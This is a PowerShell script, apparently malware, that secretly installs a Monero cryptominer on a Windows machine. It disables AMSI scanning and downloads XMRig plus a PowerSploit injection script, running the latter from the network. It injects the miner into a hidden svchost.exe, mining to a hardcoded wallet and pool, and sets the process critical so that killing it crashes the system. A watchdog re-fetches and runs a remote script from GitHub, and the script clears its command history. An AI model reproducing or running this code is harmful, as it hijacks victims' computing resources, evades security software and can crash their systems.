try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiSession','NonPublic,Static')
    if($f) {[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$f.GetValue($null),6)}
} catch {}

$base = "$env:COMPUTERNAME-$env:USERNAME-$(Get-CimInstance Win32_ComputerSystemProduct | Select -Expand UUID -ErrorAction SilentlyContinue)"
$worker = "KAGE-" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($base)).Substring(0,16) -replace '[+/=]','X'

$wallet = "878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
$pool   = "gulf.moneroocean.stream:10128"
$args   = "-o $pool -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"

$xmrigUrl = "https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
try {
    $zip = (New-Object Net.WebClient).DownloadData($xmrigUrl)
} catch { exit }

Add-Type -AssemblyName System.IO.Compression.FileSystem
$stream = New-Object IO.MemoryStream(,$zip)
$archive = New-Object IO.Compression.ZipArchive($stream)
$entry = $archive.GetEntry("xmrig.exe")
$exeStream = $entry.Open()
$bytes = New-Object byte[] $entry.Length
$exeStream.Read($bytes,0,$bytes.Length) | Out-Null
$exeStream.Close(); $stream.Close(); $archive.Dispose()

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')

$proc = Start-Process "svchost.exe" -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 2
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id -ExeArgs $args -Force

$src = @"
using System;
using System.Runtime.InteropServices;
public class Imm {
    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int, bool, bool, out bool);
    [DllImport("ntdll.dll")] public static extern uint NtSetInformationProcess(IntPtr, int, ref int, int);
    public static void Run() {
        bool b; RtlAdjustPrivilege(20, true, false, out b);
        int v = -1;
        NtSetInformationProcess((IntPtr)(-1), 29, ref v, 4);
    }
}
"@
try { Add-Type $src; [Imm]::Run() } catch {}

$scriptBlock = {
    while($true) {
        Start-Sleep -Seconds 300
        if(!(Get-Process -Id $using:proc.Id -ErrorAction SilentlyContinue)) {
            powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tesavek/stable/main/kage-v5.ps1'))"
        }
    }
}
Start-Job -ScriptBlock $scriptBlock | Out-Null

Clear-History; [Console]::WindowHeight = 1; [Console]::WindowWidth = 1